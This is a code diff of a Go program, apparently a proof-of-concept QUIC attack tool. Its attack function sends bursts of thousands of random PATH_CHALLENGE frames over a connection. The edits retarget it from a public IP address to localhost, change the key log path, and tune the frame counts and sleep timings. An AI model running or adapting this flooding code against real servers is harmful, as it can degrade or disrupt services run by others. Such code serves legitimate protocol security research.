@@ -63,7 +63,8 @@ var keyLog io.Writer
 func main() {
 	//go func() { log.Fatal(echoServer()) }()
 
-	keyLogFile := "C:\\Users\\13298\\Desktop\\key.log"
+	//keyLogFile := "C:\\Users\\13298\\Desktop\\key.log"
+	keyLogFile := "/home/john/Desktop/key.log"
 
 	if len(keyLogFile) > 0 {
 		f, err := os.Create(keyLogFile)
@@ -74,7 +75,7 @@ func main() {
 		keyLog = f
 	}
 
-	args := []string{"localhost", "183.173.168.115"}
+	args := []string{"localhost", "127.0.0.1"}
 	if len(args) != 2 {
 		log.Fatalf("usage: %v <domain> <ip>", os.Args[0])
 	}
@@ -336,7 +337,7 @@ func attack(connectAddr, serverName string, request *HTTPMessage, prefix, suffix
 	//发送PATH_CHALLENGE帧
 	randomBytes := make([]byte, 8)
 
-	for i := 0; i < 33; i++ {
+	for i := 0; i < 56; i++ {
 		rand.Read(randomBytes)
 		var randomBytesArray [8]byte
 		copy(randomBytesArray[:], randomBytes)
@@ -351,7 +352,9 @@ func attack(connectAddr, serverName string, request *HTTPMessage, prefix, suffix
 
 	}
 
-	for i := 0; i < 5987; i++ {
+	time.Sleep(time.Microsecond * 800)
+
+	for i := 0; i < 5727; i++ {
 		rand.Read(randomBytes)
 		var randomBytesArray [8]byte
 		copy(randomBytesArray[:], randomBytes)
@@ -362,7 +365,7 @@ func attack(connectAddr, serverName string, request *HTTPMessage, prefix, suffix
 			path_challengeFrame,
 		}
 		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(path_challenge_frame)
-		time.Sleep(time.Nanosecond * 480)
+		time.Sleep(time.Microsecond * 100)
 	}
 
 	/*
